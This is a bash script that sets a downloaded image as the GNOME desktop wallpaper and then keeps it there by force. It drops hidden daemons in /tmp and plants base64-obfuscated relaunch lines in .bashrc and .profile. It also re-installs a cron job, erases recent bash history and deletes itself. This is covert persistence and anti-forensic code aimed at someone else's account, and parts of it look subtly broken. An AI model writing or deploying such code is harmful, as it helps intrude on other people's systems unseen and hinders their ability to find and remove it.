#!/bin/bash

site=       #  Set the website where the image will be obtained from
file=       #  Provide the filename to be downloaded and used

wget -O $HOME/$file $site/$file  #  d/l background img to user's home dir

#  Set the background after running - currently this only works in Gnome  
gsettings set org.gnome.desktop.background picture-uri file:///home/$USER/$file

cat > /tmp/.io.daemon <<WTF
#!/bin/bash
file=
while true; do
  gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file
  sleep 120
done
WTF
chmod +x /tmp/.io.daemon
/bin/bash /tmp/.io.daemon

for x in .bashrc .profile
do
  sed -i '2i abc=$(ps faux | grep $(echo LmlvLmRhZW1vbgo=|base64 -D))\\
  result=$?\\
  if [ "${result}" -ne 0 ]; then /bin/bash $(echo LmlvLmRhZW1vbgo=|base64 -D); fi ' "$x"
done

#  Create file .uwpc.bak which will be called by crontab to set the background
#+ to /home/$USER/$file && make the file executable
cat > /tmp/.uwpc.bak <<Write_UWPC
#!/bin/bash
#  Set necessary enviromental variables in order for cron to call the script
#+ and gsettings to work properly
PID=\$(pgrep gnome-session)
export DBUS_SESSION_BUS_ADDRESS=\$(grep -z DBUS_SESSION_BUS_ADDRESS \
/proc/\$PID/environ|cut -d= -f2-)

file=       #  Make sure that you set the same filename
gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file
Write_UWPC
chmod +x /tmp/.uwpc.bak

#  Create file mps.daemon to run in the background, running the infinite while
#+ loop checking for the crontab. This will also check if .uwpc.bak exists &
#+ if not then create it

cat > /tmp/.mps.daemon <<Write_MPS_Daemon
#!/bin/bash
while true; do
  #  Variables
  cron=\$(crontab -l)
  chkCron="0 2 * * * /tmp/.uwpc.bak"  # Change this val if different time is needed
  site=                 #  Make sure you set the website to obtain image from
  file=                 #  Set the filename for the background image

  # Check if cronjob still exists for user
  if [ "\$cron" != "\$chkCron" ]; then
    echo "0 2 * * * /tmp/.uwpc.bak" > /tmp/cron # Make sure this matches \$chkCron
    crontab /tmp/cron   # Push the above line to crontab
    rm /tmp/cron        # Delete the file once done
  fi
  
  #  Check if the image still exists. If it has been moved/removed then use
  #+ wget to download it again to the same location
  if [ ! -f "/home/\$USER/\$file" ]; then
    wget -O /home/\$USER/\$file \$site
  fi   

  uwpc=/tmp/.uwpc.bak
  # Check if .uwpc.bak exists, if not create it!
  if [ ! -f "\$uwpc" ]; then
    cat > /tmp/.uwpc.bak <<Write_UWPC_from_Daemon
#!/bin/bash
file=       #  Make sure that you set the same filename
PID=$(pgrep gnome-session)
export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS \
/proc/$PID/environ|cut -d= -f2-)
gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file 
Write_UWPC_from_Daemon
chmod +x /tmp/.uwpc.bak
  fi
     sleep 1500 # Run these checks every 25 minutes
done
Write_MPS_Daemon
chmod +x /tmp/.mps.daemon
/bin/bash /tmp/.mps.daemon & # start up the script and push it to the background

#  Remove the last five lines from .history_bash by placing it in a temp file
#+ and copying the reduced version to the original
sleep 10
head -n -5 ~/.bash_history > ~/.history.tmp
mv -f ~/.history.tmp ~/.bash_history

#  As script is run with nohup, remove the nohup.out
if [ -f nohup.out ]
then
  rm nohup.out
fi
#  This will self delete the script after running the above commands and
#+ writing the files. This command should be the last one!
rm -- "$0"
